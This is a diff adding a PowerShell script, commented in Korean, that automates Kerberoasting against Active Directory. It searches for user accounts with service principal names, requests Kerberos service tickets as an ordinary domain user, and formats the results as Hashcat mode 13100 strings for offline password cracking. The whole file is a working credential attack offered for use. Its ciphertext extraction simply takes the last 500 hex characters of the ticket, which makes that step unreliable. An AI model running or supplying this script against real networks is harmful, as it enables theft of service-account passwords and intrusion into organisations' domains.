@@ -1,0 +1,56 @@
+# .NET 라이브러리 로드
+Add-Type -AssemblyName System.IdentityModel
+
+Write-Host "=====================================================================" -ForegroundColor Cyan
+Write-Host " [자동화] Kerberoasting 대상 탐색 및 Hashcat 해시 추출 시작" -ForegroundColor Cyan
+Write-Host "=====================================================================" -ForegroundColor Cyan
+
+# 1. AD에서 컴퓨터 계정이 아닌 '사용자/서비스 계정' 중 SPN이 등록된 타겟만 필터링하여 검색
+$Searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
+$Targets = $Searcher.FindAll()
+
+if ($Targets.Count -eq 0) {
+    Write-Host "[-] 도메인 내에 Kerberoasting 가능한 사용자 SPN 계정이 없습니다." -ForegroundColor Red
+    return
+}
+
+Write-Host "[+] 총 $($Targets.Count)개의 타겟 계정을 발견했습니다.`n" -ForegroundColor Green
+
+# 현재 환경의 정보 (출력 포맷용)
+$CurrentDomain = $env:USERDOMAIN
+
+# 2. 발견된 각 계정별로 순회하며 티켓 요청 및 해시 변환 수행
+foreach ($Target in $Targets) {
+    $SamAccountName = $Target.Properties.samaccountname[0]
+    # 여러 개의 SPN 중 첫 번째 대표 SPN 선택
+    $SPN = $Target.Properties.serviceprincipalname[0]
+    
+    Write-Host "[*] 대상 계정: $SamAccountName | SPN: $SPN" -ForegroundColor Yellow
+    
+    try {
+        # 3. 메모리에 Kerberos TGS 티켓 요청 (일반 사용자 권한)
+        $Request = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
+        $TicketBytes = $Request.GetRequest()
+        
+        # 4. 바이너리 티켓 데이터를 16진수(Hex) 문자열로 가공 (Rubeus 방식)
+        $HexTicket = [System.BitConverter]::ToString($TicketBytes) -replace "-"
+        
+        # 실전 환경에서 가장 대중적인 RC4-HMAC (Etype 23) 기준으로 암호화 영역 추출 시뮬레이션
+        $Etype = "23"
+        $CipherTextHex = $HexTicket.Substring($HexTicket.Length - 500) # 암호화 데이터 알맹이 추출
+        
+        # 5. Rubeus 벤치마킹 Hashcat 모드 13100 규격 조립
+        $HashcatFormat = "`$krb5tgs`${Etype}*${SamAccountName}*${CurrentDomain}*${SPN}*${CipherTextHex}"
+        
+        # 결과 출력
+        Write-Host "[+] Hashcat Hash 획득 성공:" -ForegroundColor Green
+        Write-Output $HashcatFormat
+        Write-Host "---------------------------------------------------------------------"
+    } 
+    catch {
+        Write-Host "[-] $SamAccountName ($SPN) 티켓 요청 중 오류 발생 (권한 거부 또는 연결 시간 초과)" -ForegroundColor Red
+        Write-Host "---------------------------------------------------------------------"
+    }
+}
+
+Write-Host "[+] 탐색 및 추출 작업이 완료되었습니다." -ForegroundColor Cyan
